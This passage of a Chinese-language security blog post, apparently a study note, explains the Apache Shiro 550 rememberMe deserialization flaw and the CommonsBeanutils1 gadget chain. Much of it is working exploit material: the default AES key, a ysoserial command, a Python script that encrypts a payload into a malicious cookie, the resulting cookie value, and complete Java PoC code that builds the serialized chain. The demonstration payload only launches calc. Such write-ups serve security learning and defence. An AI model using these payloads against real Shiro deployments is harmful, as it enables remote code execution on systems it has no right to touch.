\u0026#34;/shiro/deserialize\u0026#34;) public String shiro_deserialize(HttpServletRequest req, HttpServletResponse res) { Cookie cookie = getCookie(req, Constants.REMEMBER_ME_COOKIE); if (null == cookie) { return \u0026#34;No rememberMe cookie. Right?\u0026#34;; } try { String rememberMe = cookie.getValue(); byte[] b64DecodeRememberMe = java.util.Base64.getDecoder().decode(rememberMe); byte[] aesDecrypt = acs.decrypt(b64DecodeRememberMe, KEYS).getBytes(); ByteArrayInputStream bytes = new ByteArrayInputStream(aesDecrypt); ObjectInputStream in = new ObjectInputStream(bytes); in.readObject(); in.close(); } catch (Exception e){ if (CookieUtils.addCookie(res, \u0026#34;rememberMe\u0026#34;, DELETE_ME)){ log.error(e.getMessage()); return \u0026#34;RememberMe cookie decrypt error. Set deleteMe cookie success.\u0026#34;; } } return \u0026#34;Shiro deserialize\u0026#34;; } Shiro rememberMe 功能用于“记住登录状态”。它的设计逻辑是：\n用户勾选“记住我”登录后，Shiro 把用户的认证信息序列化为字节流，用一个固定密钥（默认是 kPH+bIxk5D2deZiIxcaaaA==）用 AES 加密，Base64 编码后作为 rememberMe Cookie 发送给浏览器。当浏览器下次请求时，Shiro：读取 rememberMe Cookie，用同样的密钥进行解密，然后直接反序列化出用户对象，只要攻击者能控制 rememberMe Cookie 内容，就能构造恶意对象反序列化，从而执行任意代码。\n漏洞利用：\n生成恶意序列化数据\nplain\r1 java -jar ysoserial.jar CommonsBeanutils1 \u0026#34;calc.exe\u0026#34; \u0026gt; payload.bin 加密 Payload\npython\r1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 from Crypto.Cipher import AES import base64 # Shiro 默认密钥 key = base64.b64decode(\u0026#34;kPH+bIxk5D2deZiIxcaaaA==\u0026#34;) # 读取 payload with open(\u0026#34;D:\\\\CTF-Tools\\\\ysoserial-master\\\\target\\\\payload.bin\u0026#34;, \u0026#34;rb\u0026#34;) as f: payload = f.read() # 补齐为 16 的倍数 (PKCS5Padding) pad = 16 - len(payload) % 16 payload += bytes([pad] * pad) # AES-CBC 加密 (IV 随机生成) iv = b\u0026#39;\\x00\u0026#39; * 16 # 实际攻击需随机 IV cipher = AES.new(key, AES.MODE_CBC, iv) encrypted = cipher.encrypt(payload) # Base64 编码 rememberMe = base64.b64encode(iv + encrypted).decode() # Shiro 格式: IV+密文 print(\u0026#34;恶意 Cookie:\u0026#34;, rememberMe) plain\r1 2 恶意 Cookie: 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 发送 cookie 请求\nplain\r1 2 Cookie: rememberMe=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 也可以利用工具：\n总结： 重写readObject\njava\r1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 //Serializable 接口表示这个类支持 Java 序列化 public class UserDemo implements Serializable { public String name=\u0026#34;qaz\u0026#34;; public String gender=\u0026#34;man\u0026#34;; //构造方法 public UserDemo(String name,String gender){ this.name=name; this.gender=gender; System.out.println(name); System.out.println(gender); } //重写 readObject ，当使用 ObjectInputStream.readObject() 反序列化时，JVM 会自动检查类里是否有 private void readObject(ObjectInputStream) 方法，如果有，就会在恢复对象后调用它 private void readObject(ObjectInputStream ois) throws IOException, ClassNotFoundException { //表示按照默认方式反序列化对象的字段 ois.defaultReadObject(); //反序列化时直接执行系统命令 Runtime.getRuntime().exec(\u0026#34;calc\u0026#34;); } } Shiro使用的是Java原生反序列化（当一个类实现了Serializable接口并且重写readObject方法时，该方法会在对象进行反序列化时被调用），其漏洞成因是反序列化的类重写了readObject方法，反序列化时调用readObject() 触发重写类的readObject() 方法\n利用：恶意命令 -\u0026gt; 序列化 -\u0026gt; AES加密 -\u0026gt; Base64编码 -\u0026gt; rememberMe Cookie 值 -\u0026gt; Base64解码 -\u0026gt; AES解密 -\u0026gt; 反序列化 -\u0026gt; 执行恶意命令\nShiro 550反序列化 前置知识 参考文章： 关于我学渗透的那档子事之Java反序列化-CB链\nhttps://www.freebuf.com/articles/web/319397.html\nJava代码审计\u0026amp;Shiro反序列化\u0026amp;CB1链\nhttps://blog.csdn.net/qq_46081990/article/details/135724944\nCC链 1-7 分析\nhttps://xz.aliyun.com/news/8908\nJavaweb安全——反序列化漏洞-CC\u0026amp;CB链思路整理\nhttps://blog.csdn.net/weixin_43610673/article/details/127580121\n1、CC \u0026amp; CB 链 （简单理解） shiro反序列化利用工具\nJavaThings - Java安全漫谈笔记相关\nhttps://github.com/phith0n/JavaThings/tree/master\nCommons Collections 链\n来源 Apache Commons Collections 库，利用该库的 Transformer、LazyMap 等类，在反序列化时自动调用恶意代码\nCommons Beanutils 链\n来源：Apache Commons Beanutils 库，利用 BeanComparator 在反序列化触发排序比较时，调用 getter 方法，从而间接触发另一条漏洞链（常常是 cc 链）\nCB 链生成：\njava\r1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 public class Client1 { public static void main(String []args) throws Exception { ClassPool pool = ClassPool.getDefault(); //获取 Evil 类，执行 Runtime.getRuntime().exec(\u0026#34;calc.exe\u0026#34;); CtClass clazz = pool.get(com.govuln.shiroattack.Evil.class.getName()); //调用 CommonsBeanutils1Shiro#getPayload，传入序列化的恶意类，生成 CB1 链反序列化的 payload byte[] payloads = new CommonsBeanutils1Shiro().getPayload(clazz.toBytecode()); AesCipherService aes = new AesCipherService(); //将 key 值Base64 编码 byte[] key = java.util.Base64.getDecoder().decode(\u0026#34;kPH+bIxk5D2deZiIxcaaaA==\u0026#34;); //使用 AES 加密 payload， ByteSource ciphertext = aes.encrypt(payloads, key); System.out.printf(ciphertext.toString()); } } 2、一个完整的攻击链通常由以下三个部分组成： 1、Source（源）：入口点，通常是指攻击链的起始点，其中用户输入或外部数据进入应用程序。在反序列化漏洞中，readObject 方法通常被认为是源，因为它是从输入流读取数据并进行反序列化的方法。\n2、Sink（执行点）：执行点，是攻击链上的终点，其中攻击者希望执行恶意操作的位置。在反序列化漏洞中，sink 可能是一个动态方法执行、JNDI注入或写文件等操作。\n3、Gadget（链）：连接入口执行的多个类，通过它们的相互方法调用形成攻击链。Gadget 类通常满足一些条件，例如类之间方法调用\n是链式的，类实例之间的关系是嵌套的，调用链上的类都需要是可以序列化的。在反序列化漏洞中，Gadget 类是攻击者构建的、可序列\n化的类，通过构建特定的对象图，使得在反序列化时执行恶意代码。\n3、理解数据结构 数据结构：\nhttps://oi-wiki.org/ds/\n二叉堆\nhttps://oi-wiki.org/ds/binary-heap/\n堆分为大根堆（父节点值不小于子节点值）和小根堆（父节点值不大于子节点值）\n4、CB中的JavaBean利用 PropertyUtils.getProperty(new Person(),\u0026ldquo;name\u0026rdquo;);\n自动调用Person对象里面的getName方法\nPropertyUtils.getProperty(new TemplatesImpl(),\u0026ldquo;outputProperties\u0026rdquo;)\n自动调用TemplatesImpl对象里面的getOutputProperties方法\nShiro 550 CB1 链分析 利用链流程： **入口点：**PriorityQueue#readObject方法（java/util/PriorityQueue.java），PriorityQueue类中重写了readObject方法，Shiro反序列化时会调用这个类调用重写的readObject方法\n步入 heapify()\nplain\r1 2 3 4 5 6 // PriorityQueue 想象成一个二叉堆，本质是用一个数组 queue[] 存储的特殊二叉树 // heapify 的作用就是把一个“乱序”的数组，重新整理成符合堆规则的小根堆（即父节点值 \u0026lt;= 子节点值） private void heapify() { for (int i = (size \u0026gt;\u0026gt;\u0026gt; 1) - 1; i \u0026gt;= 0; i--) siftDown(i, (E) queue[i]); } 跟进 siftDown\nplain\r1 2 3 4 5 6 7 // siftDown() 方法其实是 堆化(heapify) 的核心步骤之一，用于把某个元素往下移动，使其符合小根堆规则 private void siftDown(int k, E x) { if (comparator != null) siftDownUsingComparator(k, x); else siftDownComparable(k, x); } 跟进 siftDownUsingComparator ，堆化操作（heapify）的具体实现，用 Comparator 来比较元素大小。\n跟进 comparator#compare，Comparator\u0026lt;T\u0026gt; 是一个函数式接口，用来定义“两个对象谁大谁小”。\n它不要求对象本身实现 Comparable，可以把比较规则外置。\n返回值规则：\n\u0026lt; 0 → o1 比 o2 小\n0 → 相等\n\u0026gt; 0 → o1 比 o2 大\n那么接下来就要找到哪里调用了这个接口：\n关键点：BeanComparator.compare\nBeanComparator继承了Comparator类和Serializable类，并且出现了PropertyUtils.getProperty()\n那么，当执行 Object value1 = PropertyUtils.getProperty(o1, this.property);时，对其传参：\no1 = new TemplatesImpl()\nproperty = outputProperties\n就会自动调用 TemplatesImpl#getOutputProperties 方法\n关键点：getOutputProperties\n找到 getOutputProperties：\n执行：newTransformer().getOutputProperties();\n跟进 newTransformer\n跟进getTransletInstance\n跟进 defineTransletClasses，当满足 _bytecodes !== null，向下执行 loader.defineClass(_bytecodes[i]) ，将_bytecodes[i]中的字节码转换为Class对象，并将该类加载执行。\n总结调用链： PriorityQueue#readObject（入口点 Source） -\u0026gt; heapify() -\u0026gt; siftDown() -\u0026gt; siftDownUsingComparator() -\u0026gt; comparator.compare()\n-\u0026gt; BeanComparator.compare()\n-\u0026gt; PropertyUtils.getProperty()\n-\u0026gt; TemplatesImpl#getOutputProperties()（执行点 Sink） -\u0026gt; newTransformer() -\u0026gt; getTransletInstance() -\u0026gt; defineTransletClasses()\n-\u0026gt; loader.defineClass()\n参照图片：\n总结条件： size值大于等于2；size \u0026gt;\u0026gt;\u0026gt; 1\ncomparator != null\nthis.property != null\no1 = new TemplatesImpl()\u0026amp;this.property = outputProperties\n_name != null\u0026amp;_class == null\n_bytecodes != null\nPOC编写分析 ： java\r1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 package com.govuln.shiroattack; import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl; import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl; import org.apache.commons.beanutils.BeanComparator; import java.io.ByteArrayOutputStream; import java.io.ObjectOutputStream; import java.lang.reflect.Field; import java.util.PriorityQueue; public class CommonsBeanutils1Shiro { public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception { //getClass 获取对象的类，getDeclaredField 通过反射获取这个类的声明字段（包括 private） Field field = obj.getClass().getDeclaredField(fieldName); //setAccessible(true) 关闭Java语言访问检查，允许程序访问和修改私有字段，允许我们突破私有权限限制，操作私有字段 field.setAccessible(true); //把传入的 value 赋给 obj 对象的这个字段 field.set(obj, value); } public byte[] getPayload(byte[] clazzBytes) throws Exception { // TemplatesImpl 类 常用于加载 XSLT 模板,核心是它 _bytecodes 字段，存放字节码 TemplatesImpl obj = new TemplatesImpl(); // 使用setFieldValue方法修改其相关成员变量的值 setFieldValue(obj, \u0026#34;_bytecodes\u0026#34;, new byte[][]{clazzBytes}); setFieldValue(obj, \u0026#34;_name\u0026#34;, \u0026#34;HelloTemplatesImpl\u0026#34;); // TransformerFactoryImpl setFieldValue(obj, \u0026#34;_tfactory\u0026#34;, new TransformerFactoryImpl()); //创建一个 BeanComparator，初始的 property 字段为 null final BeanComparator comparator = new BeanComparator(null, String.CASE_INSENSITIVE_ORDER); //创建一个 PriorityQueue，使用刚创建的 BeanComparator 作为元素比较器 final PriorityQueue\u0026lt;Object\u0026gt; queue = new PriorityQueue\u0026lt;Object\u0026gt;(2, comparator); // stub data for replacement later //先往 PriorityQueue 添加两个占位元素 \u0026#34;1\u0026#34; queue.add(\u0026#34;1\u0026#34;); queue.add(\u0026#34;1\u0026#34;); //通过反射设置 comparator 的 property 字段为 \u0026#34;outputProperties\u0026#34;,BeanComparator 会在比较时通过反射调用对象的 getOutputProperties() 方法 setFieldValue(comparator, \u0026#34;property\u0026#34;, \u0026#34;outputProperties\u0026#34;); setFieldValue(queue, \u0026#34;queue\u0026#34;, new Object[]{obj, obj}); // ================== // 生成序列化字符串 ByteArrayOutputStream barr = new ByteArrayOutputStream(); //通过 ObjectOutputStream 把构造好的 PriorityQueue 对象序列化成字节数组 ObjectOutputStream oos = new ObjectOutputStream(barr); oos.writeObject(queue); oos.close(); return barr.toByteArray(); } } ","permalink":"http://localhost:1313/xvsf/posts/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/","summary":"\u003ch1 id=\"shiro反序列化\"\u003eShiro反序列化\u003c/h1\u003e\n\u003ch2 id=\"shiro反序列化-1\"\u003eShiro反序列化\u003c/h2\u003e\n\u003ch3 id=\"参考文章\"\u003e参考文章：\u003c/h3\u003e\n\u003cp\u003e\u003ca href=\"https://changxia3.com/2020/09/03/Shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E7%AC%94%E8%AE%B0%E4%B8%80%EF%BC%88%E5%8E%9F%E7%90%86%E7%AF%87%EF%BC%89/\"\u003eShiro反序列化漏洞笔记一（原理篇）\u003c/a\u003e\u003c/p\u003e\n\u003ch3 id=\"环境搭建\"\u003e环境搭建\u003c/h3\u003e\n\u003cp\u003e直接从github上clone代码到本地。\u003c/p\u003e\n\u003cdiv class=\"code-block-container\" data-expanded=\"true\"\u003e\r\n    \u003cdiv class=\"code-header\"\u003e\r\n        \u003cdiv class=\"mac-buttons\"\u003e\r\n            \u003cspan class=\"mac-button red\"\u003e\u003c/span\u003e\r\n            \u003cspan class=\"mac-button yellow\"\u003e\u003c/span\u003e\r\n            \u003cspan class=\"mac-button green\"\u003e\u003c/span\u003e\r\n        \u003c/div\u003e\r\n        \u003cspan class=\"code-language\"\u003eplain\u003c/span\u003e\r\n        \u003cdiv class=\"code-actions\"\u003e\r\n            \u003cbutton class=\"copy-btn\" title=\"Copy\"\u003e\r\n                \u003csvg xmlns=\"http://www.w3.org/2000/svg\" width=\"16\" height=\"16\" viewBox=\"0 0 24 24\" fill=\"none\" stroke=\"currentColor\" stroke-width=\"2\" stroke-linecap=\"round\" stroke-linejoin=\"round\"\u003e\u003crect x=\"9\" y=\"9\" width=\"13\" height=\"13\" rx=\"2\" ry=\"2\"\u003e\u003c/rect\u003e\u003cpath d=\"M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1\"\u003e\u003c/path\u003e\u003c/svg\u003e\r\n            \u003c/button\u003e\r\n            \u003cbutton class=\"toggle-btn\" title=\"Toggle\"\u003e\r\n                \u003csvg xmlns=\"http://www.w3.org/2000/svg\" width=\"16\" height=\"16\" viewBox=\"0 0 24 24\" fill=\"none\" stroke=\"currentColor\" stroke-width=\"2\" stroke-linecap=\"round\" stroke-linejoin=\"round\" class=\"feather feather-chevron-down\"\u003e\u003cpolyline points=\"6 9 12 15 18 9\"\u003e\u003c/polyline\u003e\u003c/svg\u003e\r\n            \u003c/button\u003e\r\n        \u003c/div\u003e\r\n    \u003c/div\u003e\r\n    \u003cdiv class=\"code-content\"\u003e\u003cdiv class=\"highlight\"\u003e\u003cdiv class=\"chroma\"\u003e\n\u003ctable class=\"lntable\"\u003e\u003ctr\u003e\u003ctd class=\"lntd\"\u003e\n\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode\u003e\u003cspan class=\"lnt\" id=\"1\"\u003e\u003ca class=\"lnlinks\" href=\"#1\"\u003e1\u003c/a\u003e\n\u003c/span\u003e\u003cspan class=\"lnt\" id=\"2\"\u003e\u003ca class=\"lnlinks\" href=\"#2\"\u003e2\u003c/a\u003e\n\u003c/span\u003e\u003cspan class=\"lnt\" id=\"3\"\u003e\u003ca class=\"lnlinks\" href=\"#3\"\u003e3\u003c/a\u003e\n\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/td\u003e\n\u003ctd class=\"lntd\"\u003e\n\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-plain\" data-lang=\"plain\"\u003e\u003cspan 